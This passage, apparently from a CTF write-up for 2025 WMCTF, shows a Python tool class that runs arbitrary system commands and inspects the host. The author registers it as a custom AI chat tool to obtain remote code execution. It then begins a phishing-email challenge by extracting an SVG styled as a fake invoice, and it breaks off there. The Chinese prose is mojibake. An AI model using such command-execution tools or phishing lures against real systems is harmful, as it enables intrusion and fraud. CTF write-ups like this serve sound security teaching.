</span></span><span class=line><span class=cl>                    <span class=n>timeout</span><span class=o>=</span><span class=n>timeout</span>
</span></span><span class=line><span class=cl>                <span class=p>)</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>process</span><span class=o>.</span><span class=n>returncode</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Command executed successfully:</span><span class=se>\n</span><span class=si>{</span><span class=n>stdout</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Command failed with error:</span><span class=se>\n</span><span class=si>{</span><span class=n>stderr</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>                    
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=n>asyncio</span><span class=o>.</span><span class=n>TimeoutError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>process</span><span class=o>.</span><span class=n>kill</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=k>await</span> <span class=n>process</span><span class=o>.</span><span class=n>communicate</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Command timed out after </span><span class=si>{</span><span class=n>timeout</span><span class=si>}</span><span class=s2> seconds.&#34;</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Error executing command: </span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>list_directory_contents</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>path</span><span class=p>:</span> <span class=nb>str</span> <span class=o>=</span> <span class=s2>&#34;.&#34;</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        List the contents of a directory.
</span></span></span><span class=line><span class=cl><span class=s2>        
</span></span></span><span class=line><span class=cl><span class=s2>        :param path: The directory path to list. Defaults to current directory.
</span></span></span><span class=line><span class=cl><span class=s2>        :return: A formatted string with directory contents.
</span></span></span><span class=line><span class=cl><span class=s2>        &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Path &#39;</span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s2>&#39; does not exist.&#34;</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>isdir</span><span class=p>(</span><span class=n>path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;&#39;</span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s2>&#39; is not a directory.&#34;</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>            <span class=n>items</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>listdir</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>items</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Directory &#39;</span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s2>&#39; is empty.&#34;</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>            <span class=c1># Format the output</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;Contents of &#39;</span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s2>&#39;:</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>items</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>full_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>item</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>isdir</span><span class=p>(</span><span class=n>full_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=n>result</span> <span class=o>+=</span> <span class=sa>f</span><span class=s2>&#34;[DIR]  </span><span class=si>{</span><span class=n>item</span><span class=si>}</span><span class=s2>/</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>size</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>getsize</span><span class=p>(</span><span class=n>full_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>result</span> <span class=o>+=</span> <span class=sa>f</span><span class=s2>&#34;[FILE] </span><span class=si>{</span><span class=n>item</span><span class=si>}</span><span class=s2> (</span><span class=si>{</span><span class=n>size</span><span class=si>}</span><span class=s2> bytes)</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>                    
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>result</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Error listing directory: </span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_system_info</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        Get basic system information.
</span></span></span><span class=line><span class=cl><span class=s2>        
</span></span></span><span class=line><span class=cl><span class=s2>        :return: A string with system information.
</span></span></span><span class=line><span class=cl><span class=s2>        &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>info</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=c1># Get platform information</span>
</span></span><span class=line><span class=cl>            <span class=kn>import</span> <span class=nn>platform</span>
</span></span><span class=line><span class=cl>            <span class=n>info</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;System: </span><span class=si>{</span><span class=n>platform</span><span class=o>.</span><span class=n>system</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>info</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Node: </span><span class=si>{</span><span class=n>platform</span><span class=o>.</span><span class=n>node</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>info</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Release: </span><span class=si>{</span><span class=n>platform</span><span class=o>.</span><span class=n>release</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>info</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Version: </span><span class=si>{</span><span class=n>platform</span><span class=o>.</span><span class=n>version</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>info</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Machine: </span><span class=si>{</span><span class=n>platform</span><span class=o>.</span><span class=n>machine</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>info</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Processor: </span><span class=si>{</span><span class=n>platform</span><span class=o>.</span><span class=n>processor</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=c1># Get memory information (Linux/Mac)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>platform</span><span class=o>.</span><span class=n>system</span><span class=p>()</span> <span class=ow>in</span> <span class=p>[</span><span class=s2>&#34;Linux&#34;</span><span class=p>,</span> <span class=s2>&#34;Darwin&#34;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;/proc/meminfo&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>meminfo</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>meminfo</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                            <span class=k>if</span> <span class=n>line</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;MemTotal:&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                                <span class=n>info</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Total Memory: </span><span class=si>{</span><span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>()[</span><span class=mi>1</span><span class=p>]</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>()[</span><span class=mi>2</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                <span class=k>break</span>
</span></span><span class=line><span class=cl>                <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>pass</span>
</span></span><span class=line><span class=cl>                    
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>info</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Error getting system info: </span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_current_working_directory</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        Get the current working directory.
</span></span></span><span class=line><span class=cl><span class=s2>        
</span></span></span><span class=line><span class=cl><span class=s2>        :return: The current working directory path.
</span></span></span><span class=line><span class=cl><span class=s2>        &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Current working directory: </span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getcwd</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Error getting current directory: </span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>change_directory</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>path</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        Change the current working directory.
</span></span></span><span class=line><span class=cl><span class=s2>        
</span></span></span><span class=line><span class=cl><span class=s2>        :param path: The path to change to.
</span></span></span><span class=line><span class=cl><span class=s2>        :return: A confirmation message or error.
</span></span></span><span class=line><span class=cl><span class=s2>        &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>os</span><span class=o>.</span><span class=n>chdir</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Changed directory to: </span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getcwd</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Error changing directory: </span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>å¤§æ¦‚åŠŸèƒ½æ˜¯ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>å¯ç”¨å·¥å…·ï¼š
</span></span><span class=line><span class=cl>execute_system_command: æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆåŒæ­¥ï¼‰
</span></span><span class=line><span class=cl>execute_system_command_async: æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆå¼‚æ­¥ï¼‰
</span></span><span class=line><span class=cl>list_directory_contents: åˆ—å‡ºç›®å½•å†…å®¹
</span></span><span class=line><span class=cl>get_system_info: è·å–ç³»ç»Ÿä¿¡æ¯
</span></span><span class=line><span class=cl>get_current_working_directory: è·å–å½“å‰å·¥ä½œç›®å½•
</span></span><span class=line><span class=cl>change_directory: æ›´æ”¹å½“å‰å·¥ä½œç›®å½•
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åå¼€ä¸ªæ–°å¯¹è¯ï¼Œå¯åŠ¨æˆ‘ä»¬è‡ªå®šçš„å·¥å…·</p><p><img src=/img/2025-WMCTF/9.png alt=img></p><p><code>execute_system_command &lt;å‘½ä»¤></code>å°±å¯å®ç°rce</p><p><img src=/img/2025-WMCTF/10.png alt=img></p><h2 id=phishing-email>phishing email</h2><p>é‚®ä»¶è—äº†ä¸ªsvgï¼Œæå–å‡ºæ¥ä»£ç å¦‚ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span><span class=lnt>325
</span><span class=lnt>326
</span><span class=lnt>327
</span><span class=lnt>328
</span><span class=lnt>329
</span><span class=lnt>330
</span><span class=lnt>331
</span><span class=lnt>332
</span><span class=lnt>333
</span><span class=lnt>334
</span><span class=lnt>335
</span><span class=lnt>336
</span><span class=lnt>337
</span><span class=lnt>338
</span><span class=lnt>339
</span><span class=lnt>340
</span><span class=lnt>341
</span><span class=lnt>342
</span><span class=lnt>343
</span><span class=lnt>344
</span><span class=lnt>345
</span><span class=lnt>346
</span><span class=lnt>347
</span><span class=lnt>348
</span><span class=lnt>349
</span><span class=lnt>350
</span><span class=lnt>351
</span><span class=lnt>352
</span><span class=lnt>353
</span><span class=lnt>354
</span><span class=lnt>355
</span><span class=lnt>356
</span><span class=lnt>357
</span><span class=lnt>358
</span><span class=lnt>359
</span><span class=lnt>360
</span><span class=lnt>361
</span><span class=lnt>362
</span><span class=lnt>363
</span><span class=lnt>364
</span><span class=lnt>365
</span><span class=lnt>366
</span><span class=lnt>367
</span><span class=lnt>368
</span><span class=lnt>369
</span><span class=lnt>370
</span><span class=lnt>371
</span><span class=lnt>372
</span><span class=lnt>373
</span><span class=lnt>374
</span><span class=lnt>375
</span><span class=lnt>376
</span><span class=lnt>377
</span><span class=lnt>378
</span><span class=lnt>379
</span><span class=lnt>380
</span><span class=lnt>381
</span><span class=lnt>382
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-XML data-lang=XML><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;svg</span> <span class=na>xmlns=</span><span class=s>&#34;http://www.w3.org/2000/svg&#34;</span> <span class=na>viewBox=</span><span class=s>&#34;0 0 800 600&#34;</span> <span class=na>width=</span><span class=s>&#34;800&#34;</span> <span class=na>height=</span><span class=s>&#34;600&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=c>&lt;!-- Fake invoice design to look legitimate --&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;rect</span> <span class=na>width=</span><span class=s>&#34;800&#34;</span> <span class=na>height=</span><span class=s>&#34;600&#34;</span> <span class=na>fill=</span><span class=s>&#34;#f8f9fa&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;rect</span> <span class=na>x=</span><span class=s>&#34;50&#34;</span> <span class=na>y=</span><span class=s>&#34;50&#34;</span> <span class=na>width=</span><span class=s>&#34;700&#34;</span> <span class=na>height=</span><span class=s>&#34;500&#34;</span> <span class=na>fill=</span><span class=s>&#34;white&#34;</span> <span class=na>stroke=</span><span class=s>&#34;#dee2e6&#34;</span> <span class=na>stroke-width=</span><span class=s>&#34;2&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=c>&lt;!-- Header --&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;400&#34;</span> <span class=na>y=</span><span class=s>&#34;100&#34;</span> <span class=na>text-anchor=</span><span class=s>&#34;middle&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;24&#34;</span> <span class=na>font-weight=</span><span class=s>&#34;bold&#34;</span> <span class=na>fill=</span><span class=s>&#34;#212529&#34;</span><span class=nt>&gt;</span>INVOICE #2025-0727<span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;400&#34;</span> <span class=na>y=</span><span class=s>&#34;130&#34;</span> <span class=na>text-anchor=</span><span class=s>&#34;middle&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;14&#34;</span> <span class=na>fill=</span><span class=s>&#34;#6c757d&#34;</span><span class=nt>&gt;</span>Payment Due: August 15, 2025<span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=c>&lt;!-- Company info --&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;80&#34;</span> <span class=na>y=</span><span class=s>&#34;180&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;16&#34;</span> <span class=na>font-weight=</span><span class=s>&#34;bold&#34;</span> <span class=na>fill=</span><span class=s>&#34;#495057&#34;</span><span class=nt>&gt;</span>From:<span class=nt>&lt;/text&gt;</span>
